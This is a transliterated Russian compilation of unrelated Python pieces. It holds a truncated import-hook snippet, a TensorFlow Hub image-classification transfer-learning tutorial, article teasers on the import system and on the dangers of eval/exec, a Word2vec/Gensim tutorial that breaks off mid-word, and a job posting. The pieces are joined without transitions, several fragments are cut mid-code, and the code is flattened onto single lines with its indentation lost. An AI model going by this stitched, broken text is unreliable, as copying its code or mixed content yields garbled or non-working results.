'sre_constants' Importing 'copyreg' Importing '_csv' Naprimer, mozhem videt', chto import csv zapuskaet import neskol'kikh drugikh modulei, ot kotorykh csv zavisit. Obratite vnimanie, chto parametr python -v interpretatora Python daiot tu zhe informatsiiu i mnogo drugikh dannykh.  Ili vot eshchio primer: skazhem, u nas zadacha izbavit' mir ot reguliarnykh vyrazhenii. (No k chemu takaia kategorichnost'? Reguliarnye vyrazheniia -- eto zdorovo!). My mozhem realizovat' sredstvo poiska, kotoroe zapreshchaet modul' reguliarnykh vyrazhenii re:   # ban_importer.pyimport sysBANNED_MODULES = {"re"}class BanFinder:  [id29436710|@classmethod]

Peredacha obucheniia s pomoshch'iu TensorFlow Hub  TensorFlow Hub - eto repozitorii predvaritel'no obuchennykh modelei TensorFlow.  V etom rukovodstve pokazano, kak: Ispol'zuite modeli iz TensorFlow Hub s tf.kerasIspol'zuite model' klassifikatsii izobrazhenii iz TensorFlow HubProstoe perenosnoe obuchenie dlia tochnoi nastroiki modeli dlia vashikh sobstvennykh klassov izobrazhenii Nastroit' import numpy as np import time import PIL.Image as Image import matplotlib.pylab as plt import tensorflow as tf import tensorflow_hub as hub  Klassifikator ImageNet  Vy nachnete s ispol'zovaniia predvaritel'no obuchennoi modeli klassifikatora, chtoby sdelat' snimok i predskazat', chto eto za izobrazhenie - obuchenie ne trebuetsia!  Skachat' klassifikator  Ispol'zuite hub.KerasLayer dlia zagruzki modeli MobileNetV2 iz TensorFlow Hub. Zdes' budet rabotat' liubaia sovmestimaia model' klassifikatora izobrazhenii iz tfhub.dev. classifier_model ="https://tfhub.dev/google/tf2-preview/mobilenet_v2/classification/4" IMAGE_SHAPE = (224, 224) classifier = tf.keras.Sequential([ hub.KerasLayer(classifier_model, input_shape=IMAGE_SHAPE+(3,)) ])  Zapustite ego na odnom izobrazhenii  Zagruzite odno izobrazhenie, chtoby primerit' model'. grace_hopper = tf.keras.utils.get_file('image.jpg','https://storage.googleapis.com/download.tensorflow.org/example_images/grace_hopper.jpg') grace_hopper = Image.open(grace_hopper).resize(IMAGE_SHAPE) grace_hopper Downloading data from https://storage.googleapis.com/download.tensorflow.org/example_images/grace_hopper.jpg 65536/61306 [================================] - 0s 0us/step  grace_hopper = np.array(grace_hopper)/255.0 grace_hopper.shape (224, 224, 3)  Dobav'te razmer partii i peredaite izobrazhenie modeli. result = classifier.predict(grace_hopper[np.newaxis, ...]) result.shape (1, 1001)  Rezul'tatom iavliaetsia 1001-elementnyi vektor logitov, otsenivaiushchii veroiatnost' kazhdogo klassa dlia izobrazheniia.  Itak, identifikator vysshego klassa mozhno naiti s pomoshch'iu argmax: predicted_class = np.argmax(result[0], axis=-1) predicted_class 653  Rasshifruite predskazaniia  Voz'mite prognoziruemyi identifikator klassa i ImageNet metki ImageNet dlia dekodirovaniia prognozov. labels_path = tf.keras.utils.get_file('ImageNetLabels.txt','https://storage.googleapis.com/download.tensorflow.org/data/ImageNetLabels.txt') imagenet_labels = np.array(open(labels_path).read().splitlines()) Downloading data from https://storage.googleapis.com/download.tensorflow.org/data/ImageNetLabels.txt 16384/10484 [==============================================] - 0s 0us/step plt.imshow(grace_hopper) plt.axis('off') predicted_class_name = imagenet_labels[predicted_class] _ = plt.title("Prediction: " + predicted_class_name.title())  Prostoe transfernoe obuchenie  No chto, esli vy khotite obuchit' klassifikator dlia nabora dannykh s raznymi klassami? Vy takzhe mozhete ispol'zovat' model' iz TFHub dlia obucheniia nastraivaemogo klassifikatora izobrazhenii, povtorno obuchiv verkhnii uroven' modeli raspoznavat' klassy v nashem nabore dannykh.  Nabor dannykh  V etom primere vy budete ispol'zovat' nabor dannykh tsvetov TensorFlow: data_root = tf.keras.utils.get_file( 'flower_photos','https://storage.googleapis.com/download.tensorflow.org/example_images/flower_photos.tgz', untar=True) Downloading data from https://storage.googleapis.com/download.tensorflow.org/example_images/flower_photos.tgz 228818944/228813984 [==============================] - 5s 0us/step  Samyi prostoi sposob zagruzit' eti dannye v nashu model' - ispol'zovat' tf.keras.preprocessing.image.ImageDataGenerator ,  Soglasheniia TensorFlow Hub dlia modelei izobrazhenii - ozhidat' vkhodnykh dannykh s plavaiushchei zapiatoi v diapazone [0, 1] . Ispol'zuite ImageDataGenerator <<S rescale parametr dlia dostizheniia etoi tseli. image_generator = tf.keras.preprocessing.image.ImageDataGenerator(rescale=1/255) image_data = image_generator.flow_from_directory(str(data_root), target_size=IMAGE_SHAPE) Found 3670 images belonging to 5 classes.  Rezul'tiruiushchii ob'ekt - iterator, kotoryi vozvrashchaet image_batch, label_batch . for image_batch, label_batch in image_data: print("Image batch shape: ", image_batch.shape) print("Label batch shape: ", label_batch.shape) break Image batch shape: (32, 224, 224, 3) Label batch shape: (32, 5)  Zapustite klassifikator dlia paketa izobrazhenii  Teper' zapustite klassifikator dlia paketa izobrazhenii. result_batch = classifier.predict(image_batch) result_batch.shape (32, 1001) predicted_class_names = imagenet_labels[np.argmax(result_batch, axis=-1)] predicted_class_names array(['daisy', 'bee', 'barn spider', 'daisy', 'balloon', 'daisy', 'cardoon', 'daisy', 'daisy', 'diaper', 'quill', 'wreck', 'hip', 'daisy', 'vase', 'daisy', 'daisy', 'daisy', 'cardoon', 'daisy', 'sea urchin', 'picket fence', 'daisy', 'strawberry', 'coral fungus', 'picket fence', 'quill', 'daisy', 'daisy', 'pot', 'sarong', 'hair slide'], dtype='<U30')  Teper' prover'te, kak eti prognozy sovpadaiut s izobrazheniiami: plt.figure(figsize=(10,9)) plt.subplots_adjust(hspace=0.5) for n in range(30): plt.subplot(6,5,n+1) plt.imshow(image_batch[n]) plt.title(predicted_class_names[n]) plt.axis('off') _ = plt.suptitle("ImageNet predictions")  Sm. LICENSE.txt dlia atributsii izobrazhenii.  Rezul'taty daleki ot ideal'nykh, no razumnye, uchityvaia, chto eto ne te klassy, dlia kotorykh model' byla obuchena (krome <<romashki>>).  Skachat' model' bez golovy  TensorFlow Hub takzhe rasprostraniaet modeli bez verkhnego urovnia klassifikatsii. Ikh mozhno ispol'zovat' dlia prostogo perenosa obucheniia.  Zdes' budet rabotat' liubaia sovmestimaia vektornaia model' funktsii izobrazheniia iz tfhub.dev. feature_extractor_model = "https://tfhub.dev/google/tf2-preview/mobilenet_v2/feature_vector/4"  Sozdaite ekstraktor priznakov. Ispol'zuite trainable=False chtoby zafiksirovat' peremennye v sloe ekstraktora priznakov, chtoby pri obuchenii izmenialsia tol'ko novyi sloi klassifikatora. feature_extractor_layer = hub.KerasLayer( feature_extractor_model, input_shape=(224, 224, 3), trainable=False)  On vozvrashchaet vektor dlinoi 1280 dlia kazhdogo izobrazheniia: feature_batch = feature_extractor_layer(image_batch) print(feature_batch.shape) (32, 1280)  Prikrepite klassifikatsionnuiu golovku  Teper' obernite sloi khaba v model' tf.keras.Sequential i dobav'te novyi sloi klassifikatsii. model = tf.keras.Sequential([ feature_extractor_layer, tf.keras.layers.Dense(image_data.num_classes) ]) model.summary() Model: "sequential_1" _________________________________________________________________ Layer (type) Output Shape Param # ================================================================= keras_layer_1 (KerasLayer) (None, 1280) 2257984 _________________________________________________________________ dense (Dense) (None, 5) 6405 ================================================================= Total params: 2,264,389 Trainable params: 6,405 Non-trainable params: 2,257,984 _________________________________________________________________ predictions = model(image_batch) predictions.shape TensorShape([32, 5])  Obuchite model'  Ispol'zuite kompiliatsiiu dlia nastroiki trenirovochnogo protsessa: model.compile( optimizer=tf.keras.optimizers.Adam(), loss=tf.keras.losses.CategoricalCrossentropy(from_logits=True), metrics=['acc'])  Teper' ispol'zuite metod .fit dlia obucheniia modeli.  Chtoby sokhranit' etot primer korotkim, poezdom vsego 2 epokhi. Chtoby vizualizirovat' progress obucheniia, ispol'zuite nastraivaemyi obratnyi vyzov, chtoby registrirovat' poteri i tochnost' kazhdogo paketa individual'no, a ne srednee za epokhu. class CollectBatchStats(tf.keras.callbacks.Callback): def __init__(self): self.batch_losses = [] self.batch_acc = [] def on_train_batch_end(self, batch, logs=None): self.batch_losses.append(logs['loss']) self.batch_acc.append(logs['acc']) self.model.reset_metrics() steps_per_epoch = np.ceil(image_data.samples/image_data.batch_size) batch_stats_callback = CollectBatchStats() history = model.fit(image_data, epochs=2, steps_per_epoch=steps_per_epoch, callbacks=[batch_stats_callback]) Epoch 1/2 115/115 [==============================] - 12s 100ms/step - loss: 0.4156 - acc: 0.8750 Epoch 2/2 115/115 [==============================] - 12s 101ms/step - loss: 0.1960 - acc: 0.9375  Teper', dazhe posle neskol'kikh iteratsii obucheniia, my uzhe mozhem videt', chto model' uspeshno spravliaetsia s zadachei. plt.figure() plt.ylabel("Loss") plt.xlabel("Training Steps") plt.ylim([0,2]) plt.plot(batch_stats_callback.batch_losses) [<matplotlib.lines.Line2D at 0x7f3ac9d00b38>] plt.figure() plt.ylabel("Accuracy") plt.xlabel("Training Steps") plt.ylim([0,1]) plt.plot(batch_stats_callback.batch_acc) [<matplotlib.lines.Line2D at 0x7f3ac49b3e48>]  Proverit' prognozy  Chtoby povtorit' predydushchii siuzhet, snachala poluchite uporiadochennyi spisok imen klassov: class_names = sorted(image_data.class_indices.items(), key=lambda pair:pair[1]) class_names = np.array([key.title() for key, value in class_names]) class_names array(['Daisy', 'Dandelion', 'Roses', 'Sunflowers', 'Tulips'], dtype='<U10')  Zapustite paket izobrazhenii po modeli i preobrazuite indeksy v imena klassov. predicted_batch = model.predict(image_batch) predicted_id = np.argmax(predicted_batch, axis=-1) predicted_label_batch = class_names[predicted_id]  Postroite rezul'tat label_id = np.argmax(label_batch, axis=-1) plt.figure(figsize=(10,9)) plt.subplots_adjust(hspace=0.5) for n in range(30): plt.subplot(6,5,n+1) plt.imshow(image_batch[n]) color = "green" if predicted_id[n] == label_id[n] else "red" plt.title(predicted_label_batch[n].title(), color=color) plt.axis('off') _ = plt.suptitle("Model predictions (green: correct, red: incorrect)")  Eksportiruite vashu model'  Teper', kogda vy obuchili model', eksportiruite ee kak SavedModel dlia dal'neishego ispol'zovaniia. t = time.time() export_path = "/tmp/saved_models/{}".format(int(t)) model.save(export_path) Prodolzhaem izuchat' sistemu importa s primerami. Uznaem, chto proiskhodit pri importe modulei i paketov, kakuiu rol' igraiut pri etom kesh modulei i singltony, i razberiomsia, pochemu vstroennye moduli ne zateniaiutsia lokal'nymi. Poprobuem rasshirit' sistemu importa sobstvennym zagruzchikom i sredstvom poiska, nauchimsia nastraivat' avtomaticheskuiu ustanovku modulei iz PyPl i pokazhem neskol'ko khitrykh priiomov. Pochemu opasno ispol'zovat' funktsii system(), eval() ili exec() i kak zashchitit'sia ot in'ektsii koda    Razbiraemsia, pochemu odnu iz samykh poleznykh vozmozhnostei sovremennykh iazykov programmirovaniia nuzhno ispol'zovat' s ostorozhnost'iu.   V bol'shinstve sovremennykh iazykov programmirovaniia est' funktsii, kotorye pozvoliaiut vypolnit' kakuiu-nibud' komandu operatsionnoi sistemy ili zapustit' kod:

Obuchaem Word2vec: praktikum po sozdaniiu vektornykh modelei iazyka  Vvedenie  Word2vec -- biblioteka dlia polucheniia vektornykh predstavlenii slov na osnove ikh sovmestnoi vstrechaemosti v tekstakh. Sistemnyi Blok' uzhe pisal ranee o tom, kak rabotaiut eti modeli, i vy mozhete osvezhit' v pamiati mekhanizmy raboty Word2vec, prochitav etu stat'iu.  Seichas my zaimemsia bolee praktichnymi i prizemlennymi veshchami: nauchimsia ispol'zovat' Word2vec v svoei povsednevnoi rabote. My budem ispol'zovat' realizatsiiu Word2vec v biblioteke Gensim dlia iazyka programmirovaniia Python.  T'iutorial sostoit iz dvukh chastei:   V pervoi chasti my nauchimsia predobrabatyvat' tekstovye faily i samostoiatel'no trenirovat' vektornuiu model' na svoikh dannykh.Vo vtoroi chasti my razberiomsia, kak zagruzhat' uzhe gotovye vektornye modeli i rabotat' s nimi. Naprimer, my nauchimsia vypolniat' prostye operatsii nad vektorami slov, takie kak <<naiti slovo s naibolee blizkim vektorom>> ili <<vychislit' koeffitsient blizosti mezhdu dvumia vektorami slov>>. Takzhe my rassmotrim bolee slozhnye operatsii nad vektorami, naprimer, <<naiti semanticheskie analogi>> ili <<naiti lishnii vektor v gruppe slov>>. Dlia prokhozhdeniia t'iutoriala my rekomenduem ispol'zovat' Python3. Rabotosposobnost' koda dlia Python2 ne garantiruetsia. Kod iz etogo t'iutoriala takzhe dostupen v formate jupyter-tetradki.  Predobrabotka tekstovykh dannykh i trenirovka modeli  Prezhde chem perekhodit' k trenirovke modelei, byvaet neobkhodimo privesti dannye v format, udobnyi dlia raboty. Teksty obychno ochishchaiutsia ot punktuatsii, privodiatsia k nizhnemu registru. Etot protsess nazyvaetsia predobrabotkoi tekstovykh dannykh. Dlia togo chtoby nachat' trenirovat' vektornuiu model' pri pomoshchi Word2vec, predobrabotku teksta vypolniat' ne obiazatel'no. Dlia togo chtoby algoritm mog vyuchit' vektora slov, dostatochno vsego lish' razdelit' tekst na predlozheniia.  Odnako v nashem t'iutoriale my razberiom, kak vypolniat' bolee glubokuiu predobrabotku teksta: lemmatizatsiiu i chasterechnyi analiz. Eto nuzhno dlia togo, chtoby vy sami mogli sozdavat' modeli, sovmestimye s uzhe gotovymi modeliami RusVect?r?s. Nu i prosto znanie o tom, kak ustroena predobrabotka teksta, mozhet prigodit'sia vo mnogikh zadachakh obrabotki iazyka.  Obrabotka teksta  Predobrabotka tekstov dlia trenirovki modelei vygliadit sleduiushchim obrazom:   snachala my privedem vse slova k nachal'noi forme (lemmatiziruem) i udalim stop-slova;zatem my privedem vse lemmy k nizhnemu registru;dlia kazhdogo slova dobavim ego chasterechnyi teg. Davaite poprobuem vossozdat' protsess predobrabotki teksta na primere rasskaza O. Genri <<Russkie sobolia>>. Dlia predobrabotki mozhno ispol'zovat' razlichnye teggery, my seichas budem ispol'zovat' UDPipe, chtoby srazu poluchit' chasterechnuiu razmetku v vide Universal POS-tags. Snachala ustanovim obertku UDPipe dlia Python s pomoshch'iu pitonovskogo paket-menedzhera pip:   pip install ufal.udpipe UDPipe ispol'zuet predobuchennye modeli dlia lemmatizatsii i tegginga. Vy mozhete ispol'zovat' uzhe gotovuiu model' ili obuchit' svoiu.  Chtoby zagruzhat' faily, mozhno ispol'zovat' pitonovskuiu biblioteku wget:   pip install wget Kusok koda nizhe skachaet rasskaz O'Genri i model' UDPipe dlia lingvisticheskoi predobrabotki. Model' vesit 40 megabait, poetomu iacheika mozhet vypolniatsia nekotoroe vremia, osobenno esli u vas nebystryi internet.   import wget import sys udpipe_url = 'https://rusvectores.org/static/models/udpipe_syntagrus.model' text_url = 'https://rusvectores.org/static/henry_sobolya.txt' modelfile = wget.download(udpipe_url) textfile = wget.download(text_url) Pristupim k sobstvenno predobrabotke teksta. Poprobuem lemmatizirovat' tekst i dobavit' chasterechnye tegi pri pomoshchi etoi funktsii:   def process(pipeline, text='Stroka', keep_pos=True, keep_punct=False): entities = {'PROPN'} named = False # peremennaia dlia zapominaniia togo, chto nam vstretilos' imia sobstvennoe memory = [] mem_case = None mem_number = None tagged_propn = [] # obrabatyvaem tekst, poluchaem rezul'tat v formate conllu: processed = pipeline.process(text) # propuskaem stroki so sluzhebnoi informatsiei: content = [l for l in processed.split(' ') if not l.startswith('#')] # izvlekaem iz obrabotannogo teksta lemmy, tegi i morfologicheskie kharakteristiki tagged = [w.split(' ') for w in content if w] for t in tagged: if len(t) != 10: # esli spisok korotkii -- strochka ne soderzhit razbora, propuskaem continue (word_id,token,lemma,pos,xpos,feats,head,deprel,deps,misc) = t if not lemma or not token: # esli slovo pustoe -- propuskaem continue if pos in entities: # zdes' otdel'no obrabatyvaem imena sobstvennye -- oni trebuiut osobogo obrashcheniia if '|' not in feats: tagged_propn.append('%s_%s' % (lemma, pos)) continue morph = {el.split('=')[0]: el.split('=')[1] for el in feats.split('|')} if 'Case' not in morph or 'Number' not in morph: tagged_propn.append('%s_%s' % (lemma, pos)) continue if not named: named = True mem_case = morph['Case'] mem_number = morph['Number'] if morph['Case'] == mem_case and morph['Number'] == mem_number: memory.append(lemma) if 'SpacesAfter= ' in misc or 'SpacesAfter=s ' in misc: named = False past_lemma = '::'.join(memory) memory = [] tagged_propn.append(past_lemma + '_PROPN ') else: named = False past_lemma = '::'.join(memory) memory = [] tagged_propn.append(past_lemma + '_PROPN ') tagged_propn.append('%s_%s' % (lemma, pos)) else: if not named: if pos == 'NUM' and token.isdigit(): # Zameniaem chisla na xxxxx toi zhe dliny lemma = num_replace(token) tagged_propn.append('%s_%s' % (lemma, pos)) else: named = False past_lemma = '::'.join(memory) memory = [] tagged_propn.append(past_lemma + '_PROPN ') tagged_propn.append('%s_%s' % (lemma, pos)) if not keep_punct: # obrabatyvaem sluchai, kogda pol'zovatel' poprosil ne sokhraniat' punktuatsiiu (po umolchaniiu ona sokhraniaetsia) tagged_propn = [word for word in tagged_propn if word.split('_')[1] != 'PUNCT'] if not keep_pos: tagged_propn = [word.split('_')[0] for word in tagged_propn] return tagged_propn Etu funktsiiu mozhno takzhe izmenit' pod konkretnuiu zadachu. Naprimer, esli chasterechnye tegi nam ne nuzhny, v funktsii nizhe vystavim keep_pos=False. Esli neobkhodimo sokhranit' znaki punktuatsii, mozhno vystavit' keep_punct=True.  Teper' zagruzhaem model' UDPipe, chitaem tekstovyi fail i obrabatyvaem ego pri pomoshchi nashei funktsii. V faile dolzhen soderzhat'sia neobrabotannyi tekst (odno predlozhenie na stroku ili odin abzats na stroku). Na vykhod my poluchaem posledovatel'nost' razdelennykh probelami lemm s chastiami rechi (<<zelenyi_NOUN tramvai_NOUN>>).   from ufal.udpipe import Model, Pipeline import os import re def tag_ud(text='Tekst nuzhno peredat' funktsii v vide stroki!', modelfile='udpipe_syntagrus.model'): udpipe_model_url = 'https://rusvectores.org/static/models/udpipe_syntagrus.model' udpipe_filename = udpipe_model_url.split('/')[-1] if not os.path.isfile(modelfile): print('UDPipe model not found. Downloading...', file=sys.stderr) wget.download(udpipe_model_url) print(' Loading the model...', file=sys.stderr) model = Model.load(modelfile) process_pipeline = Pipeline(model, 'tokenize', Pipeline.DEFAULT, Pipeline.DEFAULT, 'conllu') print('Processing input...', file=sys.stderr) lines = text.split(' ') tagged = [] for line in lines: # line = unify_sym(line.strip()) # zdes' mogla by byt' vasha funktsiia ochistki teksta output = process(process_pipeline, text=line) tagged_line = ' '.join(output) tagged.append(tagged_line) return ' '.join(tagged) text = open(textfile, 'r', encoding='utf-8').read() processed_text = tag_ud(text=text, modelfile=modelfile) print(processed_text[:350]) with open('my_text.txt', 'w', encoding='utf-8') as out: out.write(processed_text) > russkii_PROPN sobol'_NOUN o.::genri_PROPN kogda_SCONJ sinii_ADJ kak_SCONJ noch'_NOUN glaz_NOUN Molli_VERB Mak-Kiver_PROPN klast'_VERB malysh::Bredi_PROPN na_ADP oba_NUM lopatka_NOUN on_PRON vynuzhdennyi_ADJ byt'_AUX pokidat'_VERB riad_NOUN banda_NOUN <<Dymovyi_ADJ truba<<_NOUN takov_ADJ vlast'_NOUN nezhnyi_ADJ ukor_NOUN podruzhka_NOUN i_CCONJ ona_PRON  Nasha funktsiia napechataet obrabotannyi tekst, kotoryi my teper' mozhem takzhe sokhranit' v fail.  Itak, v khode etoi chasti t'iutoriala my nauchilis' ot <<syrogo teksta>> prikhodit' k lemmatizirovannomu tekstu s chasterechnymi tegami, kotoryi uzhe mozhno podavat' na vkhod modeli! Teper' teper' poprobuem natrenirovat' vektornuiu model'.  Trenirovka modeli  Dlia raboty s embeddingami slov sushchestvuiut razlichnye biblioteki: gensim, keras, tensorflow, pytorch. My budem rabotat' s bibliotekoi gensim.  Gensim -- iznachal'no biblioteka dlia tematicheskogo modelirovaniia tekstov. Odnako pomimo razlichnykh algoritmov dlia topic modeling v nei realizovany na python i algoritmy iz tulkita word2vec (kotoryi v originale byl napisan na C++). Prezhde vsego, esli gensim u vas na komp'iutere ne ustanovlen, nuzhno ego ustanovit':   pip install gensim Gensim reguliarno obnovliaetsia, tak chto ne budet lishnim udostoverit'sia, chto u vas ustanovlena posledniaia versiia, a pri neobkhodimosti proapdeitit' biblioteku:   pip install gensim --upgrade Pri podgotovke etogo t'iutoriala ispol'zovalsia gensim versii 3.7.0.  Poskol'ku obuchenie i zagruzka modelei mogut zanimat' prodolzhitel'noe vremia, inogda byvaet polezno vesti log sobytii. Dlia etogo ispol'zuetsia standartnaia pitonovskaia biblioteka logging.   import sys import gensim, logging logging.basicConfig(format='%(asctime)s : %(levelname)s : %(message)s', level=logging.INFO) Na vkhod modeli my daem nash obrabotannyi tekstovyi fail (libo liuboi drugoi tekst, vazhno lish', chto kazhdoe predlozhenie dolzhno byt' na otdel'noi strochke).   f = 'my_text.txt' data = gensim.models.word2vec.LineSentence(f) Initsializiruem model'. Parametry v skobochkakh:   data -- dannye,size -- razmer vektora,window -- razmer okna nabliudeniia,min_count -- min. chastotnost' slova v korpuse, kotoroe my berem,sg -- ispol'zuemyi algoritm obucheniia (0 -- CBOW, 1 -- Skip-gram)model = gensim.models.Word2Vec(data, size=500, window=10, min_count=2, sg=0) My sozdaem model', v kotoroi razmernost' vektorov -- 500, razmer okna nabliudeniia -- 10 slov, algoritm obucheniia -- CBOW, slova, vstretivshiesia v korpuse tol'ko 1 raz, ne ispol'zuiutsia. Posle trenirovki modeli mozhno normalizovat' vektora, togda model' budet zanimat' men'she RAM. Odnako posle etogo eio nel'zia dotrenirovat'.   model.init_sims(replace=True) Smotrim, skol'ko v modeli slov (korpus u nas byl nebol'shoi):   print(len(model.wv.vocab)) > 252 I sokhraniaem nashu model'!   model.save('my.model')   Rabota s vektornymi modeliami pri pomoshchi biblioteki Gensim  Dlia svoikh individual'nykh nuzhd i eksperimentov byvaet polezno samomu natrenirovat' model' na nuzhnykh dannykh i s nuzhnymi parametrami. No dlia kakikh-to obshchikh tselei modeli uzhe est' kak dlia russkogo iazyka, tak i dlia angliiskogo.  Modeli dlia russkogo skachat' mozhno zdes'.  Sushchestvuiut neskol'ko formatov, v kotorykh mogut khranit'sia modeli. Vo-pervykh, dannye mogut khranit'sia v nativnom formate word2vec, pri etom model' mozhet byt' binarnoi ili ne binarnoi. Dlia zagruzki modeli v formate word2vec v klasse KeyedVectors (v kotorom khranitsia bol'shinstvo otnosiashchikhsia k distributivnym modeliam funktsii) sushchestvuet funktsiia load_word2vec_format, a binarnost' modeli mozhno ukazat' v argumente binary (vnizu budet primer). Pomimo etogo, model' mozhno khranit' i v sobstvennom formate gensim, dlia etogo sushchestvuet klass Word2Vec s funktsiei load. Poskol'ku modeli byvaiut raznykh formatov, to dlia nikh napisany raznye funktsii zagruzki; byvaet polezno uchityvat' eto v svoem skripte. Nash kod opredeliaet tip modeli po eio rasshireniiu, no voobshche fail s model'iu mozhet nazyvat'sia kak ugodno, zhestkikh ogranichenii dlia rasshireniia net.  Davaite skachaem noveishuiu model' dlia russkogo iazyka, sozdannuiu na osnove Natsional'nogo korpusa russkogo iazyka (NKRIa), i zagruzim v eio v pamiat' (poskol'ku zip-arkhiv s model'iu vesit pochti 500 megabait, sleduiushchaia iacheika vypolnitsia u vas ne srazu!). Raspakovyvat' skachannyi arkhiv dlia obychnykh modelei ne nuzhno, tak kak ego soderzhimoe prochitaetsia pri pomoshchi spetsial'noi instruktsii:   import zipfile model_url = 'http://vectors.nlpl.eu/repository/20/180.zip' m = wget.download(model_url) model_file = model_url.split('/')[-1] with zipfile.ZipFile(model_file, 'r') as archive: stream = archive.open('model.bin') model = gensim.models.KeyedVectors.load_word2vec_format(stream, binary=True)   Ishchem semanticheskuiu blizost'  Dopustim, nam interesny takie slova (primer dlia russkogo iazyka):   words = ['den'_NOUN', 'noch'_NOUN', 'chelovek_NOUN', 'semantika_NOUN', 'student_NOUN', 'student_ADJ'] Poprosim u modeli 10 blizhaishikh sosedei dlia kazhdogo slova i koeffitsient kosinusnoi blizosti dlia kazhdogo:   for word in words: # est' li slovo v modeli? Mozhet byt', i net if word in model: print(word) # vydaem 10 blizhaishikh sosedei slova: for i in model.most_similar(positive=[word], topn=10): # slovo + koeffitsient kosinusnoi blizosti print(i[0], i[1]) print(' ') else: # Uvy! print(word + ' is not present in the model') > den'_NOUN nedelia_NOUN 0.7375996112823486 den'_PROPN 0.7067666053771973 mesiats_NOUN 0.7037326097488403 chas_NOUN 0.6643950343132019 utro_NOUN 0.6526744365692139 vecher_NOUN 0.6038411855697632 sutki_NOUN 0.5923081040382385 voskresen'e_NOUN 0.5842781066894531 polden'_NOUN 0.5743687748908997 subbota_NOUN 0.5345946550369263  noch'_NOUN noch'_PROPN 0.8310786485671997 vecher_NOUN 0.7183679342269897 rassvet_NOUN 0.696594774723053 nochi_NOUN 0.692021906375885 polnoch'_NOUN 0.6704976558685303 noch'_VERB 0.6615264415740967 utro_NOUN 0.6263935565948486 nochnoi_ADJ 0.6024709939956665 polden'_NOUN 0.5835086107254028 sumerki_NOUN 0.5671443343162537  chelovek_NOUN chelovek_PROPN 0.7850059270858765 chelovecheskii_ADJ 0.5915265679359436 sushchestvo_NOUN 0.573693037033081 narod_NOUN 0.5354466438293457 lichnost'_NOUN 0.5296981334686279 chelovechestvo_NOUN 0.5282931327819824 chelovk'_PROPN 0.5047001838684082 individuum_NOUN 0.5000404119491577 nravstvennyi_ADJ 0.4972919821739197 potomu_ADV 0.49293622374534607  semantika_NOUN semanticheskii_ADJ 0.8019332885742188 sintaksicheskii_ADJ 0.7569340467453003 modal'nyi_ADJ 0.7296056747436523 semanticheski_ADV 0.7209396958351135 smyslovoi_ADJ 0.7159026861190796 referentsiia_NOUN 0.7135108709335327 noeticheskii_ADJ 0.7080267071723938 iazykovoi_ADJ 0.7067198753356934 lingvisticheskii_ADJ 0.6928658485412598 predikat_NOUN 0.68775475025177  student_NOUN prepodavatel'_NOUN 0.6743764281272888 studencheskii_ADJ 0.6486333608627319 universitetskii_ADJ 0.6442699432373047 zaochnik_NOUN 0.6423174142837524 pervokursnik_NOUN 0.6409708261489868 kursistka_NOUN 0.636457085609436 diplomnik_NOUN 0.6341054439544678 aspirant_NOUN 0.6337910890579224 universitet_NOUN 0.6302101612091064 studentka_NOUN 0.6299037337303162  student_ADJ is not present in the model  Kak vidim, model' vydala po 10 blizhaishikh semanticheskikh <<sosedei>> dlia kazhdogo slova. Krome neizvestnogo ei (i nam tozhe) prilagatel'nogo student ('student_ADJ'). Prilagatel'noe studencheskii ona, razumeetsia, znaet:   model.most_similar(positive=['studencheskii_ADJ'], topn=10) [('universitetskii_ADJ', 0.6642225384712219), ('student_NOUN', 0.6486333012580872), ('studenchestvo_NOUN', 0.6344770789146423), ('institutskii_ADJ', 0.6142880320549011), ('gimnazicheskii_ADJ', 0.5510081648826599), ('aspirantskii_ADJ', 0.5403808951377869), ('shkol'nyi_ADJ', 0.5198260545730591), ('studentskii_ADJ', 0.5004373788833618), ('ifli_PROPN', 0.48894092440605164), ('molodezhnyi_ADJ', 0.47924578189849854)]  Teper' nauchimsia nakhodit' kosinusnuiu blizost' pary slov. Eto legko:   print(model.similarity('chelovek_NOUN', 'obez'iana_NOUN')) > 0.22025344   Bolee slozhnye operatsii nad vektorami  Pomimo bolee prostykh operatsii nad vektorami (nakhozhdenie kosinusnoi blizosti mezhdu dvumia vektorami i blizhaishikh sosedei vektora) gensim pozvoliaet vypolniat' i bolee slozhnye operatsii nad neskol'kimi vektorami. Tak, naprimer, my mozhem naiti lishnee slovo v gruppe. Lishnim slovom iavliaetsia to, vektor kotorogo naibolee udalen ot drugikh vektorov slov.   print(model.doesnt_match('iabloko_NOUN grusha_NOUN vinograd_NOUN banan_NOUN limon_NOUN kartofel'_NOUN'.split())) > kartofel'_NOUN Takzhe mozhno skladyvat' i vychitat' vektora n

Razrabotchik Python v Directadvert (directadvert.ru) / ot 150 000 do 170 000 rub.  Nasha kompaniia iavliaetsia odnim iz aktivnykh uchastnikov reklamnogo rynka runeta. Ezhednevno nashi servera obrabatyvaiut sotni millionov zaprosov na pokazy reklamy pol'zovateliam. Ispol'zuiutsia tekhnologii RTB, retargetinga, mashinnogo obucheniia i mnogie drugie.    My ispol'zuem OS Debian Linux, SUBD Postgresql, veb-server nginx, Python3 kak osnovnoi iazyk dlia novykh proektov. Prisutstvuet otlazhennyi protsess razrabotki, baziruiushchiisia na Agile-metodologiiakh. Komanda sochetaet v sebe kak bol'shoi nakoplennyi opyt, tak i stremlenie k samym noveishim tekhnologiiam.    Dlia dal'neishego razvitiia platformy i uluchsheniia sushchestvuiushchego funktsionala trebuetsia gramotnyi vo vsekh otnosheniiakh razrabotchik. Eto vakansiia na novuiu pozitsiiu, rasshiriaem komandu.    Obiazannosti:   - Razrabotka Backend na Python + SQL. Zadachi obsuzhdaiutsia na tekh. rev'iu. raz v paru dnei. Uchastvuet komanda razrabotchikov, timlidy i product owner.  - Profilirovanie koda, optimizatsiia proizvoditel'nosti  - Napisanie testov (ispol'zuem pytest)  - Uchastie v proektirovanii novoi arkhitektury (seichas prorabatyvaem API v2 i vsiu sistemu v tselom)  - Podderzhka legasi na Pyhton 3.7 + Flask + SQLAlchemy + PostgreSQL   Trebovaniia:   - My ishchem deistvitel'no neravnodushnogo cheloveka, kotoromu nebezrazlichen rezul'tat ego raboty, kotoryi raduetsia kogda u nego poluchilos' khorosho i kotoryi zadumyvaetsia kogda u nego poluchilos' plokho. Eto - glavnoe trebovanie dlia etoi vakansii.    A takzhe:   - Opyt raboty veb-razrabotchikom v komande ot 3-kh let  - Uverennoe vladenie Python 3, znanie slabykh i sil'nykh storon  - Khoroshee znanie liuboi reliatsionnoi SUBD i ponimanie printsipov ee raboty  - Umenie pisat' kod, kotoryi potom legko chitat'. My ispol'zuem github, tak chto budut kod-rev'iu. Takzhe ispol'zuem flake8 i mypy.  - Akkuratnost'. Gramotnyi russkii iazyk.  - Opyt 